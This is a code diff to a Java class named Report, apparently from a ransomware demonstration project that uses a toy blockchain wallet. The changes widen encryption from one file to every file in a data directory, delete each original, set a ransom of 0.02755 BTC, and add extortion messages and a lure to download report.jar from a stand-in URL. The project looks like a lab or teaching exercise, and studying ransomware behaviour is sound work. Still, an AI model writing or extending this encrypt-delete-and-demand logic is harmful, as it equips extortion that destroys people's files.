@@ -1,5 +1,6 @@
 package report;
 
+import blockchain.Network;
 import blockchain.Wallet;
 
 import javax.crypto.Cipher;
@@ -42,6 +43,8 @@ public class Report implements IReport{
         this.wallet = new Wallet();
         initialBalance = wallet.getBalance();
 
+        this.ransomAmount = 0.02755;
+
         // Path of dedicated directory
         this.directory = new File(String.valueOf(Paths.get("data").toAbsolutePath()));
         try {
@@ -54,13 +57,16 @@ public class Report implements IReport{
 
     @Override
     public void checkPayment() throws Exception {
-        System.out.println("angreifer:" + wallet.getBalance());
-        if(wallet.getBalance() >= (this.initialBalance + ransomAmount)) {
-            System.out.println("transaction successful! Your files will be decrypted.");
-            startDecryption();
+        if(isEncrypted) {
+            if ((wallet.getBalance() >= (this.initialBalance + ransomAmount)) && Network.getInstance().isChainValid()) {
+                System.out.println("transaction successful! Your files will be decrypted.");
+                startDecryption();
+            } else {
+                System.out.println("You need to pay me the full amount!");
+                System.out.format("To decrypt your files, I need %.5f more BTC!\n", (ransomAmount - wallet.getBalance()));
+            }
         } else {
-            System.out.println("You need to pay me the full amount!");
-            System.out.println("To decrypt your files, I need " + (ransomAmount - wallet.getBalance()) + " more BTC!");
+            System.out.println("What payment do you want to check? Have you tried launching http://www.trust-me.mcg/report.jar?");
         }
     }
 
@@ -77,8 +83,7 @@ public class Report implements IReport{
             }
 
             // Read files into byte[] for encryption
-            //for (File f : files) {
-            File f = files.get(0);
+            for (File f : files) {
                 byte[] decrFile = readContentIntoByteArray(f);
                 byte[] encrFile = encrypt(decrFile, secretKey, nonce);
 
@@ -87,13 +92,15 @@ public class Report implements IReport{
                 }
 
                 f.delete();
-            //}
+            }
 
             isEncrypted = true;
 
             startTimer();
 
             System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
+        } else {
+            System.out.println("Your files already have been encrypted. Pay " + ransomAmount + " BTC to start the decryption.");
         }
     }
 
@@ -150,9 +157,6 @@ public class Report implements IReport{
             fileInputStream = new FileInputStream(file);
             fileInputStream.read(bFile);
             fileInputStream.close();
-            for (byte b : bFile) {
-                System.out.print((char) b);
-            }
         }
         catch (Exception e)
         {
